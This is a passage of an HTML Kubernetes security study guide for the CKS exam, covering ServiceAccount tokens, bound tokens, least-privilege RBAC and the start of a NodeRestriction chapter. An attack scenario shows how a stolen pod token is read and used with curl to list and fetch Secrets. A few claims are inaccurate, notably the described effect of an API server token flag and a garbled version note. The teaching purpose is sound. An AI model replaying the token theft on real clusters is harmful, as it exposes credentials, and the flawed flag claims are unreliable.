+                <div class="info-box tip">
+                    <h5>💡 Key Takeaway for the CKS Exam</h5>
+                    <p>Every RBAC exam task should end with <code>kubectl auth can-i --list --as=&lt;subject&gt; -n &lt;ns&gt;</code>. This shows you the subject's complete permission set — and reveals if you accidentally granted more than intended. <strong>Never submit an RBAC task without verifying both positive cases (allowed) AND negative cases (denied).</strong> If the exam asks you to restrict access to Secrets, verify that <code>kubectl auth can-i get secrets --as=&lt;subject&gt;</code> returns <code>no</code>.</p>
+                </div>
+            </div>
+        </div>        <div id="ch10">
+            <div class="chapter-intro">
+                <h3>Chapter 10: Service Accounts — Securing Pod Identity</h3>
+                <p>Every pod in Kubernetes has an identity — a <strong>ServiceAccount</strong>. By default, every pod gets the <code>default</code> ServiceAccount in its namespace, and that ServiceAccount's JWT token is automatically mounted into the pod at <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>. Any process inside the pod can read this token and use it to authenticate to the Kubernetes API. If the ServiceAccount has RBAC permissions — even accidentally — every pod using it inherits those permissions. If the token is stolen (via a compromised container, a leaked log, or a misconfigured volume), the attacker has a permanent, non-expiring credential. This chapter teaches you to control pod identity: disable token auto-mounting for pods that do not need API access, create dedicated ServiceAccounts with minimal RBAC, and use bound tokens that automatically expire — eliminating the risk of stolen credentials granting persistent access.</p>
+                <div class="chapter-meta">
+                    <span class="meta-tag">🟡 Intermediate</span>
+                    <span class="meta-tag">⏱️ ~1.5 hours</span>
+                    <span class="meta-tag">🤖 ServiceAccounts</span>
+                    <span class="meta-tag">🔑 Pod Identity</span>
+                </div>
+            </div>
+
+            <div class="learning-objectives">
+                <h4>🎯 What You'll Learn</h4>
+                <ul>
+                    <li>✅ Understand how every pod authenticates to the API server using a mounted ServiceAccount token</li>
+                    <li>✅ Recognize the dangers of the default ServiceAccount — one shared identity for all pods</li>
+                    <li>✅ Create dedicated ServiceAccounts with minimal RBAC for each workload</li>
+                    <li>✅ Disable automountServiceAccountToken for pods that never need API access</li>
+                    <li>✅ Use bound (projected) tokens that auto-expire — eliminating permanent credential theft</li>
+                </ul>
+            </div>
+
+            <div class="cka-chapter-relevance">
+                <span class="relevance-label">🎓 CKS Relevance</span>
+                <div class="relevance-domains">
+                    <span class="cka-domain-badge">Cluster Hardening <span class="cka-weight">15%</span></span>
+                    <span class="cka-domain-badge">Minimize Microservice Vulns <span class="cka-weight">20%</span></span>
+                </div>
+            </div>
+
+            <div class="cka-exam-tip">
+                <h5>🧠 The ServiceAccount Exam Pattern</h5>
+                <p>CKS ServiceAccount tasks follow a consistent pattern: (1) Identify which pods need API access and which do not, (2) For pods that do NOT need API access, set <code>automountServiceAccountToken: false</code>, (3) For pods that DO need API access, create a dedicated ServiceAccount with minimal RBAC, (4) Verify the pod can (or cannot) access the API. <strong>The exam always tests both cases: pods that should have access AND pods that should not.</strong></p>
+            </div>
+
+            <div class="section-block" id="s10-1">
+                <h3>10.1 How Pods Authenticate to the API Server</h3>
+                <p>Every pod, when it starts, has a specific set of files mounted into it by the kubelet. These files are the pod's <strong>identity documents</strong> — and any process inside the container can read them:</p>
+
+                <div class="diagram-container">
+                    <div class="diagram-title">What the kubelet mounts into every pod — the identity files</div>
+<pre>
+  $ kubectl exec anihpj-pod -- ls /var/run/secrets/kubernetes.io/serviceaccount/
+  ca.crt       ← Cluster CA certificate (to verify the API server's TLS cert)
+  namespace    ← The pod's namespace (plain text: "anihpj-prod")
+  token        ← THE JWT TOKEN — this IS the pod's identity
+
+  $ kubectl exec anihpj-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
+  eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJu
+  ZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJhbmlocGotcHJvZCIsImt1YmVybmV0ZXMuaW8vc2Vy
+  dmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJkZWZhdWx0Iiwic3ViIjoic3lzdGVtOnNlcnZpY2Vh
+  Y2NvdW50OmFuaWhwai1wcm9kOmRlZmF1bHQifQ...
+
+  # Decode the JWT payload (middle section between the dots):
+  $ echo "eyJpc3Mi..." | cut -d'.' -f2 | base64 -d | python -m json.tool
+  {
+    "iss": "kubernetes/serviceaccount",
+    "kubernetes.io/serviceaccount/namespace": "anihpj-prod",
+    "kubernetes.io/serviceaccount/secret.name": "default-token-xxxxx",
+    "kubernetes.io/serviceaccount/service-account.name": "default",
+    "sub": "system:serviceaccount:anihpj-prod:default"
+  }
+  → This pod identifies as: system:serviceaccount:anihpj-prod:default
+</pre>
+                </div>
+
+                <h4>How the Pod Uses Its Token — The Full Flow</h4>
+                <div class="diagram-container">
+                    <div class="diagram-title">From pod to API — authentication, authorization, response</div>
+<pre>
+  1. Pod starts → kubelet creates the token volume mount
+     Mount path: /var/run/secrets/kubernetes.io/serviceaccount/
+     Files: token (JWT), ca.crt (CA cert), namespace
+
+  2. App inside pod reads the token file
+     $ cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+  3. App calls the K8s API with the token as a Bearer header
+     $ curl https://kubernetes.default.svc/api/v1/namespaces/anihpj-prod/pods \
+         --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
+         -H "Authorization: Bearer $(cat /var/run/.../token)"
+
+  4. API server receives the request:
+     a. Validates the JWT signature (signed by the SA token controller)
+     b. Extracts: username = system:serviceaccount:anihpj-prod:default
+     c. Looks up RBAC: does this SA have "list pods" in anihpj-prod?
+     d. If RBAC allows → returns pod list. If not → 403 Forbidden.
+
+  IF automountServiceAccountToken: false:
+     Step 1 never happens → /var/run/secrets/ is EMPTY
+     → Pod CANNOT call the K8s API at all ✅
+</pre>
+                </div>
+
+                <h4>How the ServiceAccount Token Controller Works — Behind the Scenes</h4>
+                <p>Three Kubernetes components collaborate to make ServiceAccount tokens work. Understanding this chain helps you diagnose token issues and understand why bound tokens are fundamentally more secure:</p>
+                <div class="diagram-container">
+                    <div class="diagram-title">The ServiceAccount Token Pipeline — 3 Components</div>
+<pre>
+  1. SERVICEACCOUNT CONTROLLER (kube-controller-manager)
+     ────────────────────────────────────────────────────
+     Watches: ServiceAccount creations
+     Action: Creates a Secret (type: kubernetes.io/service-account-token)
+             containing a signed JWT for the SA.
+     ⚠️  This is LEGACY behavior — for STATIC tokens only.
+         Bound tokens are NOT created by this controller.
+
+  2. TOKEN CONTROLLER (kube-controller-manager)
+     ─────────────────────────────────────────────
+     Watches: ServiceAccount deletions
+     Action: Deletes all Secrets associated with a deleted SA.
+     Also: Signs the JWT using the cluster's ServiceAccount private key
+           (--service-account-private-key-file on kube-controller-manager).
+
+  3. KUBELET (on every node)
+     ────────────────────────
+     Action: Mounts the token into every pod's filesystem.
+     For STATIC tokens: reads the Secret, writes the token file.
+     For BOUND tokens: calls the TokenRequest API to get a fresh,
+     time-limited token on every pod start AND on rotation.
+
+  🔑 KEY INSIGHT: Bound tokens NEVER touch a Secret. The kubelet
+     calls the TokenRequest API directly, gets a JWT with an expiry,
+     and writes it to a tmpfs volume. No Secret. No persistence.
+     When the token expires, the kubelet gets a new one automatically.
+</pre>
+                </div>
+
+                <h4>The TokenRequest API — How Bound Tokens Are Created</h4>
+                <p>The TokenRequest API is the modern replacement for static ServiceAccount tokens. Instead of creating a permanent Secret, you request a temporary token with a specific audience and duration. This API is what the kubelet uses internally for projected tokens — and you can use it directly to generate short-lived tokens for CI/CD pipelines or debugging:</p>
+                <div class="diagram-container">
+                    <div class="diagram-title">Using the TokenRequest API — Generate a Short-Lived Token</div>
+<pre>
+  # Create a 1-hour token for the anihpj-sa ServiceAccount
+  $ kubectl create token anihpj-sa -n anihpj-prod --duration=1h
+  eyJhbGciOiJSUzI1NiIsImtpZCI6Ii...truncated...
+
+  # Use it directly with curl
+  $ TOKEN=$(kubectl create token anihpj-sa -n anihpj-prod --duration=1h)
+  $ curl -k https://kubernetes.default.svc/api/v1/namespaces/anihpj-prod/pods \
+      -H "Authorization: Bearer $TOKEN"
+  → Returns pods if SA has RBAC, 403 if not.
+
+  # This token expires in 1 hour. No Secret exists. Nothing to clean up.
+  # This is the recommended way to generate tokens for CI/CD, not static Secrets.
+
+  ⚠️  kubectl create token requires K8s 1.24+. For older versions,
+      use kubectl create token -- requested via the raw API.
+</pre>
+                </div>
+            </div>
+
+            <div class="section-block" id="s10-2">
+                <h3>10.2 The Dangers of the Default Service Account</h3>
+                <p>Every namespace has a <code>default</code> ServiceAccount — created automatically by the namespace controller. Unless a pod explicitly specifies <code>serviceAccountName</code>, it uses this default SA. The danger: <strong>every pod in the namespace shares the same identity.</strong> If you grant any RBAC permissions to the default SA, every pod inherits them. If one pod is compromised and its token is stolen, the attacker can impersonate every other pod in that namespace.</p>
+
+                <div class="split-panel">
+                    <div class="split-side split-bad">
+                        <h5>❌ Default ServiceAccount — Shared Identity</h5>
+                        <ul>
+                            <li>All pods → "default" SA</li>
+                            <li>Grant permissions to default → ALL pods get permissions</li>
+                            <li>One compromised pod = all pods' identity stolen</li>
+                            <li>Token never expires (old-style static token)</li>
+                            <li>Default SA appears in every namespace</li>
+                        </ul>
+                        <p style="color:#f87171;font-weight:700;">Compromised anihpj pod → can read Secrets as default SA → can access API across namespace.</p>
+                    </div>
+                    <div class="split-side split-good">
+                        <h5>✅ Dedicated ServiceAccounts — Isolated Identity</h5>
+                        <ul>
+                            <li>anihpj pod → anihpj-sa</li>
+                            <li>postgres pod → postgres-sa</li>
+                            <li>Each SA → minimal, specific RBAC permissions</li>
+                            <li>Tokens can be time-limited (projected tokens)</li>
+                            <li>Automount disabled for pods that don't need API</li>
+                        </ul>
+                        <p style="color:#4ade80;font-weight:700;">Compromised anihpj pod → can only do what anihpj-sa allows → nothing else.</p>
+                    </div>
+                </div>
+
+                <div class="info-box danger">
+                    <h5>🔴 The Default SA Is Shared — Never Give It Permissions</h5>
+                    <p>The <code>default</code> ServiceAccount should have <strong>zero RBAC permissions</strong> in every namespace. If you need a pod to access the API, create a dedicated ServiceAccount for that specific workload and grant permissions only to that SA. Never create a RoleBinding that references the default SA. If you see <code>system:serviceaccount:&lt;ns&gt;:default</code> in any RoleBinding or ClusterRoleBinding, that is a security finding that must be remediated immediately.</p>
+                </div>
+
+                <h4>Auditing Default ServiceAccount Permissions — Find the Gaps</h4>
+                <p>Use these commands to audit every namespace for default SA permissions. Any non-empty result is a security finding:</p>
+                <div class="diagram-container">
+                    <div class="diagram-title">One-Liner: Find All Permissions Granted to Default ServiceAccounts</div>
+<pre>
+  # Find every RoleBinding that references a default SA
+  $ kubectl get rolebindings,clusterrolebindings -A -o json | jq -r \
+      '.items[] | select(.subjects[]? | select(.kind=="ServiceAccount" and .name=="default")) |
+       "\(.metadata.namespace)/\(.metadata.name) → default SA"'
+
+  # Sample output (each line is a FINDING):
+  # anihpj-prod/anihpj-admin-binding → default SA 🔴
+  # kube-public/default-view → default SA 🟡 (intentional for kube-public)
+
+  # Check what the default SA can actually do in a namespace
+  $ kubectl auth can-i --list \
+      --as=system:serviceaccount:anihpj-prod:default -n anihpj-prod
+  → Must return NO permissions. If any appear, investigate immediately.
+
+  # Find namespaces where the default SA has ANY RBAC binding
+  $ for ns in $(kubectl get ns -o name | cut -d/ -f2); do
+      count=$(kubectl get rolebindings -n $ns -o json | jq \
+        '[.items[]? | select(.subjects[]? | select(.kind=="ServiceAccount" and .name=="default"))] | length')
+      if [ "$count" -gt 0 ]; then
+        echo "🔴 $ns: default SA has $count RoleBinding(s)"
+      fi
+    done
+</pre>
+                </div>
+
+                <h4>Attack Scenario: What Happens When a ServiceAccount Token Is Stolen</h4>
+                <p>Understanding the risk requires seeing the attack. Here is exactly what happens when an attacker compromises an anihpj pod and extracts its ServiceAccount token — and how the outcome differs dramatically depending on whether the SA has permissions and whether the token is static or bound:</p>
+                <div class="diagram-container">
+                    <div class="diagram-title">Scenario A: Pod with DEFAULT SA + Accidental RBAC Permissions</div>
+<pre>
+  ATTACKER compromises anihpj pod via CVE → gains shell as root
+  ─────────────────────────────────────────────────────────────────
+  $ whoami
+  root     ← Container runs as root
+
+  $ cat /var/run/secrets/kubernetes.io/serviceaccount/token
+  eyJhbGciOiJSUzI1NiIsImtpZCI6Ii...   ← THE POD'S IDENTITY
+
+  $ curl -s https://kubernetes.default.svc/api/v1/namespaces/anihpj-prod/secrets \
+      --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
+      -H "Authorization: Bearer $(cat /var/run/.../token)"
+  {
+    "items": [
+      {"metadata":{"name":"anihpj-db-credentials"}},
+      {"metadata":{"name":"anihpj-tls"}},
+      {"metadata":{"name":"aws-s3-backup-key"}}
+    ]
+  }
+  → Attacker can LIST all Secrets in the namespace!
+    Because someone granted "get secrets" to the default SA.
+
+  $ curl .../secrets/anihpj-db-credentials ...
+  → Returns DATABASE_URL with username and password.
+  → Attacker now has production database credentials.
+
+  IMPACT: Full database access. All user data. All job listings.
+  CAUSE: Default SA + accidentally granted Secret read permission.
+</pre>
+                </div>
+                <div class="diagram-container">
+                    <div class="diagram-title">Scenario B: Pod with DEDICATED SA + Zero Permissions</div>
+<pre>
+  ATTACKER compromises anihpj pod via CVE → gains shell as root
+  ─────────────────────────────────────────────────────────────────
+  $ whoami
+  root
+
+  $ cat /var/run/secrets/kubernetes.io/serviceaccount/token
+  → FILE NOT FOUND (automountServiceAccountToken: false)
+
+  $ ls /var/run/secrets/kubernetes.io/serviceaccount/
+  → DIRECTORY EMPTY
+
+  $ curl https://kubernetes.default.svc/api/v1/namespaces/anihpj-prod/secrets
+  → curl: (77) SSL certificate problem: unable to get local issuer certificate
+  → Cannot even verify the API server's TLS cert (no ca.crt mounted)
+
+  IMPACT: Zero. No token. No API access. No lateral movement via K8s API.
+  CAUSE: automountServiceAccountToken: false + dedicated SA with no RBAC.
+  Attacker must find another path — and NetworkPolicies (Ch 6) block that too.
+</pre>
+                </div>
+            </div>
+
+            <div class="section-block" id="s10-3">
+                <h3>10.3 Bound Service Account Tokens (Projected Tokens)</h3>
+                <p>Legacy ServiceAccount tokens (the kind stored as Kubernetes Secrets) are <strong>non-expiring, non-revocable, and valid for any API server audience</strong>. If an attacker steals one — from a compromised container, a leaked log file, or a misconfigured volume — they have permanent API access. <strong>Bound tokens</strong> (also called projected tokens) solve this: they are time-limited, audience-scoped, and automatically rotated by the kubelet. No Secret is created. No permanent credential exists.</p>
+
+                <h4>Old vs New ServiceAccount Tokens</h4>
+                <div class="comparison-table">
+                    <table>
+                        <thead><tr><th>Feature</th><th>Old (Static) Token</th><th>New (Bound) Token</th></tr></thead>
+                        <tbody>
+                            <tr><td><strong>Stored as</strong></td><td>Kubernetes Secret (auto-created per SA)</td><td>Projected volume (tmpfs, never on disk)</td></tr>
+                            <tr><td><strong>Expiry</strong></td><td style="color:#ef4444;">Never expires 🔴</td><td style="color:#4ade80;">1 hour (default), configurable ✅</td></tr>
+                            <tr><td><strong>Audience</strong></td><td style="color:#ef4444;">Any K8s API server 🔴</td><td style="color:#4ade80;">Specific audience (e.g., "vault") ✅</td></tr>
+                            <tr><td><strong>Rotation</strong></td><td style="color:#ef4444;">Manual only 🔴</td><td style="color:#4ade80;">Automatic (kubelet rotates before expiry) ✅</td></tr>
+                            <tr><td><strong>Revocable</strong></td><td style="color:#ef4444;">Only by deleting the Secret 🔴</td><td style="color:#4ade80;">Expires automatically ✅</td></tr>
+                            <tr><td><strong>If stolen</strong></td><td style="color:#ef4444;">Permanent access 🔴</td><td style="color:#4ade80;">Access expires within 1 hour ✅</td></tr>
+                            <tr><td><strong>Available since</strong></td><td>Kubernetes 1.0</td><td>Kubernetes 1.21+ (enabled by default in 1.24+)</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h4>Configuring a Bound Token — Pod Spec</h4>
+                <div class="diagram-container">
+                    <div class="diagram-title">Pod YAML with a projected ServiceAccount token (1-hour expiry)</div>
+<pre>
+  apiVersion: v1
+  kind: Pod
+  metadata:
+    name: anihpj-secure
+  spec:
+    serviceAccountName: anihpj-sa         # Dedicated SA, not default
+    automountServiceAccountToken: false    # Disable the default token mount
+    containers:
+    - name: anihpj
+      image: anihpj:v2
+      volumeMounts:
+      - name: token
+        mountPath: /var/run/secrets/tokens # Custom path, not the default
+        readOnly: true
+    volumes:
+    - name: token
+      projected:
+        sources:
+        - serviceAccountToken:
+            path: token                    # The token file name
+            expirationSeconds: 3600        # 1 hour expiry ← KEY FIELD
+            audience: api                  # Audience claim in the JWT
+  # ⚠️  The old default mount at /var/run/secrets/kubernetes.io/
+  #     is EMPTY because automountServiceAccountToken: false.
+  #     Only THIS projected token exists, and it expires in 1 hour.
+</pre>
+                </div>
+
+                <h4>What Happens When a Bound Token Expires Mid-Request</h4>
+                <p>A common concern with bound tokens: "What if my pod is in the middle of a long-running operation and the token expires?" The answer depends on your Kubernetes version and configuration. In K8s 1.22+, the kubelet automatically rotates the token BEFORE it expires — typically at 80% of its lifetime. The new token is written to the same file atomically, and any process that re-reads the file gets the new token. For HTTP clients that reuse connections (keep-alive), the existing connection continues to work — token validation only happens at connection establishment. For new connections, the pod reads the updated token file and presents the fresh token. <strong>Best practice:</strong> set <code>expirationSeconds</code> to at least 3600 (1 hour) to give the kubelet time to rotate. Avoid very short expirations (less than 600 seconds) unless your application explicitly handles token refresh.</p>
+
+                <h4>Disabling Legacy Tokens Cluster-Wide</h4>
+                <p>Even after you configure bound tokens for your pods, the old static token Secrets may still exist — and they never expire. The CKS exam may ask you to ensure that legacy tokens are not in use. The API server flag <code>--service-account-extend-token-expiration=false</code> (K8s 1.24+) prevents the legacy token controller from creating auto-mounted Secrets for new ServiceAccounts. Combined with <code>--service-account-issuer</code> and <code>--service-account-signing-key-file</code> (which configure the bound token issuer), you can ensure that all new tokens are bound tokens — no static Secrets created, no permanent credentials lingering in your cluster.</p>
+            </div>
+
+            <div class="section-block" id="s10-4">
+                <h3>10.4 Securing anihpj Service Accounts</h3>
+                <p>Let's apply everything to the anihpj application. We have four workloads, each with different API access needs:</p>
+
+                <div class="diagram-container">
+                    <div class="diagram-title">anihpj ServiceAccounts — Each with least privilege</div>
+<pre>
+  # ═══════════════════════════════════════════════════
+  # SA 1: anihpj-sa — Web application (NO API access)
+  # ═══════════════════════════════════════════════════
+  apiVersion: v1
+  kind: ServiceAccount
+  metadata:
+    name: anihpj-sa
+    namespace: anihpj-prod
+  automountServiceAccountToken: false   # No API access needed
+  # The Django app serves HTTP — it never calls the K8s API.
+  # Even if Django is compromised, there is no token to steal.
+
+  # ═══════════════════════════════════════════════════
+  # SA 2: postgres-sa — Database (NO API access)
+  # ═══════════════════════════════════════════════════
+  apiVersion: v1
+  kind: ServiceAccount
+  metadata:
+    name: postgres-sa
+    namespace: anihpj-prod
+  automountServiceAccountToken: false   # No API access needed
+
+  # ═══════════════════════════════════════════════════
+  # SA 3: anihpj-operator-sa — Needs to read ConfigMaps
+  # ═══════════════════════════════════════════════════
+  apiVersion: v1
+  kind: ServiceAccount
+  metadata:
+    name: anihpj-operator-sa
+    namespace: anihpj-prod
+  ---
+  apiVersion: rbac.authorization.k8s.io/v1
+  kind: Role
+  metadata:
+    name: anihpj-operator-role
+    namespace: anihpj-prod
+  rules:
+  - apiGroups: [""]
+    resources: ["configmaps"]
+    verbs: ["get", "list", "watch"]      # Only ConfigMaps, only read
+  ---
+  apiVersion: rbac.authorization.k8s.io/v1
+  kind: RoleBinding
+  metadata:
+    name: anihpj-operator-binding
+    namespace: anihpj-prod
+  subjects:
+  - kind: ServiceAccount
+    name: anihpj-operator-sa
+  roleRef:
+    kind: Role
+    name: anihpj-operator-role
+    apiGroup: rbac.authorization.k8s.io
+
+  # ═══════════════════════════════════════════════════
+  # SA 4: ci-deployer-sa — Updates Deployments
+  # ═══════════════════════════════════════════════════
+  apiVersion: v1
+  kind: ServiceAccount
+  metadata:
+    name: ci-deployer-sa
+    namespace: anihpj-prod
+  ---
+  apiVersion: rbac.authorization.k8s.io/v1
+  kind: Role
+  metadata:
+    name: ci-deployer-role
+    namespace: anihpj-prod
+  rules:
+  - apiGroups: ["apps"]
+    resources: ["deployments"]
+    verbs: ["get", "list", "update", "patch"]
+  ---
+  apiVersion: rbac.authorization.k8s.io/v1
+  kind: RoleBinding
+  metadata:
+    name: ci-deployer-binding
+    namespace: anihpj-prod
+  subjects:
+  - kind: ServiceAccount
+    name: ci-deployer-sa
+    namespace: anihpj-prod
+  roleRef:
+    kind: Role
+    name: ci-deployer-role
+    apiGroup: rbac.authorization.k8s.io
+</pre>
+                </div>
+
+                <h4>Verifying anihpj ServiceAccounts — What Each Can Do</h4>
+                <div class="comparison-table">
+                    <table>
+                        <thead><tr><th>ServiceAccount</th><th>API Access?</th><th>Permissions</th><th>Token Auto-Mount?</th></tr></thead>
+                        <tbody>
+                            <tr><td><strong>anihpj-sa</strong></td><td style="color:#ef4444;">❌ No</td><td>None</td><td style="color:#4ade80;">false ✅</td></tr>
+                            <tr><td><strong>postgres-sa</strong></td><td style="color:#ef4444;">❌ No</td><td>None</td><td style="color:#4ade80;">false ✅</td></tr>
+                            <tr><td><strong>anihpj-operator-sa</strong></td><td style="color:#4ade80;">✅ Yes</td><td>get/list/watch ConfigMaps in anihpj-prod only</td><td style="color:#4ade80;">true (needed)</td></tr>
+                            <tr><td><strong>ci-deployer-sa</strong></td><td style="color:#4ade80;">✅ Yes</td><td>get/list/update/patch Deployments in anihpj-prod only</td><td style="color:#4ade80;">true (needed)</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h4>Decision Tree: Does My Pod Need API Access?</h4>
+                <p>Walk through this decision tree for every pod in your cluster. The most common CKS mistake is either disabling the token on a pod that needs it (breaking functionality) or leaving the token mounted on a pod that does not need it (leaving a credential exposed):</p>
+                <div class="decision-tree">
+                    <div class="decision-node question">🔍 Does this pod call the Kubernetes API? (kubectl, client-go, any /api/ endpoint?)</div>
+                    <div class="decision-branches">
+                        <div><div class="decision-node no">❌ NO → automountServiceAccountToken: false. Create a dedicated SA with zero RBAC. The anihpj web app does NOT call the K8s API — it serves HTTP.</div></div>
+                        <div><div class="decision-node yes">✅ YES → Continue. The pod needs a token.</div></div>
+                    </div>
+                    <div class="decision-node question">📋 Does it need read-only access (get/list/watch) to specific resources?</div>
+                    <div class="decision-branches">
+                        <div><div class="decision-node yes">✅ YES → Create dedicated SA + Role with only get/list/watch on only the needed resources. Example: anihpj-operator-sa → ConfigMaps only.</div></div>
+                        <div><div class="decision-node no">❌ NO → Continue.</div></div>
+                    </div>
+                    <div class="decision-node question">✏️ Does it need to modify resources (create/update/delete)?</div>
+                    <div class="decision-branches">
+                        <div><div class="decision-node yes">✅ YES → Create dedicated SA + Role with only the needed verbs on only the needed resources. Example: ci-deployer-sa → update deployments only. Use bound tokens with 1-hour expiry.</div></div>
+                        <div><div class="decision-node no">🎉 Your pod needs API access but NOT to modify resources. Verify with kubectl auth can-i --list --as=system:serviceaccount:&lt;ns&gt;:&lt;sa&gt;. Every verb listed beyond get/list/watch is a finding.</div></div>
+                    </div>
+                </div>
+
+                <h4>ServiceAccount Security Maturity Model</h4>
+                <p>Where is your cluster on the ServiceAccount security maturity curve? Each stage eliminates a class of attack:</p>
+                <div class="evolution-strip">
+                    <div class="evo-item">
+                        <div class="evo-icon">🔴</div>
+                        <div class="evo-era">Stage 0</div>
+                        <h5>Default Everywhere</h5>
+                        <p>All pods use the default SA. Token auto-mounted in every pod. Static tokens never expire.</p>
+                        <div class="evo-status bad">❌ Extremely vulnerable</div>
+                    </div>
+                    <div class="evo-item">
+                        <div class="evo-icon">🟠</div>
+                        <div class="evo-era">Stage 1</div>
+                        <h5>Dedicated SAs</h5>
+                        <p>Each workload has its own SA. Default SA has zero RBAC. But tokens are still static and auto-mounted everywhere.</p>
+                        <div class="evo-status ok">⚠️ Still using static tokens</div>
+                    </div>
+                    <div class="evo-item">
+                        <div class="evo-icon">🟡</div>
+                        <div class="evo-era">Stage 2</div>
+                        <h5>Auto-Mount Disabled</h5>
+                        <p>automountServiceAccountToken: false on all pods that do not need API access. Token only present where needed.</p>
+                        <div class="evo-status ok">⚠️ Static tokens still expire never</div>
+                    </div>
+                    <div class="evo-item active">
+                        <div class="evo-icon">🟢</div>
+                        <div class="evo-era">Stage 3</div>
+                        <h5>Bound Tokens</h5>
+                        <p>All tokens are projected, time-limited, audience-scoped. Auto-rotated. No static Secrets. CKS target state.</p>
+                        <div class="evo-status good">✅ CKS Hardened</div>
+                    </div>
+                </div>
+
+                <div class="visual-summary">
+                    <h4>📊 Chapter 10 Visual Summary</h4>
+                    <div class="vs-grid">
+                        <div class="vs-item">
+                            <span class="vs-icon">🔑</span>
+                            <span class="vs-label">Pod Identity</span>
+                            <span class="vs-detail">Every pod has a ServiceAccount. Token mounted at /var/run/secrets/ — any process can read it.</span>
+                        </div>
+                        <div class="vs-item">
+                            <span class="vs-icon">🚫</span>
+                            <span class="vs-label">Default SA Danger</span>
+                            <span class="vs-detail">One shared identity for all pods. Never grant permissions to the default SA.</span>
+                        </div>
+                        <div class="vs-item">
+                            <span class="vs-icon">⏰</span>
+                            <span class="vs-label">Bound Tokens</span>
+                            <span class="vs-detail">Time-limited (1hr), audience-scoped, auto-rotated. No permanent credentials.</span>
+                        </div>
+                        <div class="vs-item">
+                            <span class="vs-icon">✅</span>
+                            <span class="vs-label">Least Privilege SAs</span>
+                            <span class="vs-detail">4 dedicated SAs for anihpj — two with zero API access, two with minimal RBAC.</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="info-box tip">
+                    <h5>💡 Key Takeaway for the CKS Exam</h5>
+                    <p>Every CKS ServiceAccount task has two parts: <strong>(1) disable the token for pods that do not need it</strong> (<code>automountServiceAccountToken: false</code>), and <strong>(2) create a dedicated SA with minimal RBAC for pods that do.</strong> Always verify BOTH: <code>kubectl exec &lt;pod&gt; -- ls /var/run/secrets/kubernetes.io/serviceaccount/</code> — if the directory is empty, the token is disabled. If it contains a token, verify the SA has only the expected permissions with <code>kubectl auth can-i --list --as=system:serviceaccount:&lt;ns&gt;:&lt;sa&gt;</code>.</p>
+                </div>
+            </div>
+        </div>        <div id="ch11">
+            <div class="chapter-intro">
+                <h3>Chapter 11: Node Restriction & Hardening Authorization</h3>
+                <p>Every Kubernetes node runs a <strong>kubelet</strong> — the agent that starts pods, reports node status, and manages container lifecycles. The kubelet communicates with the API server to register its node and update pod statuses. If a kubelet is compromised — through a container escape, a node-level exploit, or stolen credentials — it can wreak havoc: modify other nodes' labels, evict pods from healthy nodes, or impersonate other kubelets to redirect traffic. <strong>NodeRestriction</strong> is the admission plugin that limits each kubelet to only its own node and its own pods. Combined with the <strong>Node authorization mode</strong>, which restricts what kubelets can even request, these controls form a critical defense layer that the CKS exam tests heavily.</p>
+                <div class="chapter-meta">
+                    <span class="meta-tag">🟡 Intermediate</span>
+                    <span class="meta-tag">⏱️ ~1.5 hours</span>
+                    <span class="meta-tag">⚙️ Kubelet</span>
+                    <span class="meta-tag">🔐 Authorization</span>
+                </div>
+            </div>
+
+            <div class="learning-objectives">
+                <h4>🎯 What You'll Learn</h4>
+                <ul>
+                    <li>✅ Enable and verify the NodeRestriction admission plugin — limit kubelets to their own node</li>
+                    <li>✅ Understand the Node authorization mode and why it must be paired with RBAC</li>
+                    <li>✅ Compare all authorization modes and know which ones to NEVER use in production</li>
+                    <li>✅ Harden SSH access to nodes — disable root login, enforce key-only authentication</li>
+                    <li>✅ Protect the kubelet API (port 10250) from unauthorized access</li>
+                </ul>
+            </div>
+
+            <div class="cka-chapter-relevance">
+                <span class="relevance-label">🎓 CKS Relevance</span>
+                <div class="relevance-domains">
+                    <span class="cka-domain-badge">Cluster Hardening <span class="cka-weight">15%</span></span>
+                    <span class="cka-domain-badge">System Hardening <span class="cka-weight">10%</span></span>
+                </div>
+            </div>
+
+            <div class="section-block" id="s11-1">
+                <h3>11.1 The NodeRestriction Admission Plugin</h3>
+                <p>NodeRestriction is an <strong>admission plugin</strong> — it intercepts API requests from kubelets and validates that each kubelet is only modifying resources it owns. Without NodeRestriction, a compromised kubelet on node-worker-2 can modify labels on node-worker-1 (impersonating another node), evict pods from node-worker-3, or modify pod labels to bypass scheduling constraints. With NodeRestriction, each kubelet is strictly limited to its own node object and the pods scheduled on it.</p>
+
+                <div class="info-box danger">
+                    <h5>🔴 Without NodeRestriction — One Compromised Kubelet = Cluster-Wide Chaos</h5>
+                    <p>A compromised kubelet can: modify ANY node's labels (redirecting workloads), evict pods from ANY node (causing denial of service), modify pod labels to bypass affinity rules, and update node statuses to disrupt scheduling. NodeRestriction prevents ALL of this by enforcing: "kubelet on node-X can only modify node-X and pods on node-X."</p>
+                </div>
+
+                <h4>NodeRestriction — What Each Kubelet Can and Cannot Touch</h4>
+                <div class="split-panel">
+                    <div class="split-side split-bad">
+                        <h5>❌ WITHOUT NodeRestriction</h5>
+                        <p><strong>Scenario:</strong> kubelet on node-worker-2 is compromised.</p>
+                        <ul>
+                            <li>🔴 Modify labels on node-worker-1 (impersonate other nodes)</li>
+                            <li>🔴 Evict pods from node-worker-3 (disrupt other nodes)</li>
+                            <li>🔴 Modify pod labels it doesn't run (bypass scheduling)</li>
+                            <li>🔴 Update any node's status to NotReady</li>
+                            <li>🔴 This enables privilege escalation across the entire cluster</li>
+                        </ul>
+                    </div>
+                    <div class="split-side split-good">
+                        <h5>✅ WITH NodeRestriction</h5>
+                        <p><strong>Scenario:</strong> kubelet on node-worker-2 is compromised.</p>
+                        <ul>
+                            <li>✅ Can read its own node object (node-worker-2) — only</li>
+                            <li>✅ Can modify its own node status and labels — only</li>
